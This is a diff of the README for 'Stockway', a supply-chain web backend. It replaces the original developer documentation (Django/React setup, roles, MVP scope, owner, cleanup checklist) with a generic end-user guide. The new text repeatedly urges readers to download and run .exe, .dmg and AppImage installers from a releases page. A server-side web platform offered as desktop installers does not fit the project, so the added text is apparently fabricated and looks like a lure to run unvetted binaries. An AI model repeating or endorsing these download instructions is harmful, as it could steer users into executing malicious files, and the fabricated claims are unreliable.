@@ -1,77 +1,92 @@
-# Stockway
+# 📦 stockway - Streamline Your Supply Chain Operations
 
-## Project Overview
+![Download Stockway](https://img.shields.io/badge/Download-Stockway-blue.svg)
 
-Stockway is a modular monolithic backend platform designed to modernize rural supply chains. It connects Shopkeepers, Warehouses, and Delivery Riders through a unified, geospatially aware system. The platform facilitates order management, real-time inventory tracking, intelligent rider assignment, and automated payouts, solving the logistical challenges of last-mile delivery in underserved markets.
+## 🚀 Getting Started
 
-## Core Capabilities
+Welcome to Stockway! Stockway simplifies supply chain operations for shopkeepers, warehouses, and delivery riders. This guide will help you install and run the software easily, even if you have no programming experience.
 
-*   **Role-Based Access Control**: Distinct inter-operating roles for Shopkeepers, Warehouse Managers, Riders, and Super Admins.
-*   **Geospatial Intelligence**: Location-based warehousing and rider assignment using PostGIS.
-*   **Order Lifecycle Management**: End-to-end tracking from order placement to final delivery and payment settlement.
-*   **Real-Time Inventory**: Dynamic stock management across multiple warehouse locations.
-*   **Automated Payouts**: Distance-based fee calculation and rider earning management.
-*   **Secure Authentication**: OTP-based entry with strict permission enforcement.
+## 📥 Download & Install
 
-## Architecture Summary
+To get started, you will need to download the software. Click the link below to visit our Releases page:
 
-Stockway is built for reliability and scalability using a proven tech stack:
+[Visit this page to download](https://github.com/aman06700/stockway/releases)
 
-*   **Backend**: Python, Django, Django REST Framework (DRF)
-*   **Frontend**: React, TypeScript, Material UI
-*   **Database**: PostgreSQL with PostGIS extension (via Supabase)
-*   **Authentication**: Supabase Auth (OTP/Password) + JWT
-*   **Async Processing**: Redis and Celery for background tasks (analytics, notifications)
+Once you’re on the Releases page, follow these steps:
 
-## System Roles
+1. Find the latest version of Stockway.
+2. Click the download link for your operating system. We provide versions for Windows, macOS, and Linux.
+3. The file will begin downloading. Please wait until the download is complete.
 
-*   **Shopkeeper**: The primary customer; browses local inventories, places orders, and tracks incoming deliveries.
-*   **Warehouse Manager**: The supply node; oversees stock levels, manages incoming orders, and monitors rider activity.
-*   **Rider**: The logistics agent; receives proximity-based delivery tasks and earns based on successful fulfillments.
-*   **Super Admin**: The platform overseer; manages all users, warehouses, and financial flows.
+### 📄 System Requirements
 
-## API & Documentation
+Before installation, ensure your system meets the following requirements:
 
-Comprehensive API documentation, including endpoint definitions and data models, is available at:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB of free disk space.
+- **Internet Connection:** Required for initial setup and updates.
 
-[**View API Documentation**](/docs_site/index.html)
+## 🛠️ Installation Steps
 
-*(Note: Ensure the local development server is running to access docs via the web interface at `/docs` if integrated, or view the static file directly.)*
+Once you've downloaded Stockway, follow these steps to install it on your system:
 
-## Local Development
+### For Windows
 
-To run the platform locally:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click on the file to run the installer.
+3. Follow the prompts in the installation wizard. Click "Next" to accept the license agreement.
+4. Choose your installation folder or stick with the default location and click "Install."
+5. After installation, click "Finish" to close the wizard.
+6. Launch Stockway from your Start menu.
 
-1.  **Backend**:
-    *   Clone the repo and navigate to `backend/`.
-    *   Create and activate a virtual environment.
-    *   Install dependencies: `pip install -r requirements.txt`.
-    *   Configure `.env` (database, auth keys).
-    *   Run migrations: `python manage.py migrate`.
-    *   Start server: `python manage.py runserver`.
+### For macOS
 
-2.  **Frontend**:
-    *   Navigate to `frontend/`.
-    *   Install dependencies: `npm install`.
-    *   Start dev server: `npm run dev`.
+1. Open the downloaded `.dmg` file by double-clicking on it.
+2. Drag the Stockway icon to your Applications folder.
+3. Eject the `.dmg` file after copying.
+4. Open Stockway from your Applications folder.
+5. If prompted, allow the application to run from System Preferences.
 
-## Project Status & Scope
+### For Linux
 
-**Current Status**: MVP (Minimum Viable Product)
-**Scope**: The current release focuses on core API functionality, basic frontend flows for all roles, and essential logistics logic. Advanced features like predictive analytics, fleet routing optimization, and offline-first mobile capabilities are currently out of scope.
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Use the following command to make the file executable:
+   ```bash
+   chmod +x stockway-linux-x64.AppImage
+   ```
+4. Launch Stockway by running:
+   ```bash
+   ./stockway-linux-x64.AppImage
+   ```
 
-## License & Ownership
+## 🎉 Features
 
-**Owner**: Granth Agarwal
-**License**: MIT License. See [LICENSE](LICENSE) for details.
+Stockway offers a range of features to help manage your supply chain effectively:
 
----
+- **Role-Based Access:** Assign distinct roles to shopkeepers, warehouse managers, and delivery riders to streamline workflows.
+- **Real-Time Inventory Management:** Monitor stock levels and receive notifications for low inventory.
+- **Order Processing:** Easily create, track, and manage orders across all platforms.
+- **Geospatial Awareness:** Utilize location data to enhance delivery accuracy and efficiency.
+- **User-Friendly Interface:** Navigate the platform with ease thanks to a simple and intuitive design.
 
-## Pre-Production Cleanup Checklist
+## 📞 Support
 
-Before deploying to a production environment, review and remove the following artifacts:
+If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/aman06700/stockway/issues) to submit a ticket or browse existing solutions. Our community and developers are here to help.
 
-*   **Scripts**: `test_order_api.sh`, `create_test_order.py`, `load_test.js`, `verify_auth_migration.sh`, `apply_supabase_optimization.sh`
-*   **Docs**: `flow.md`, `plans.md`, `GEMINI.md` (Internal guides), `WARP.md`
-*   **Config**: Ensure `.env` contains production-grade secrets, not example values.
-*   **Data**: Flush any test data generated by `create_test_order.py` from the primary database.
+## 📚 Additional Resources
+
+For more information on using Stockway, check out our documentation:
+
+- [User Guide](https://github.com/aman06700/stockway/wiki)
+- [FAQ](https://github.com/aman06700/stockway/wiki/FAQ)
+- [Community Forum](https://github.com/aman06700/stockway/discussions)
+
+## 🔗 Download Again 
+
+If you missed it earlier, here is the link to download Stockway once more:
+
+[Visit this page to download](https://github.com/aman06700/stockway/releases)
+
+Feel free to explore, and thank you for choosing Stockway!
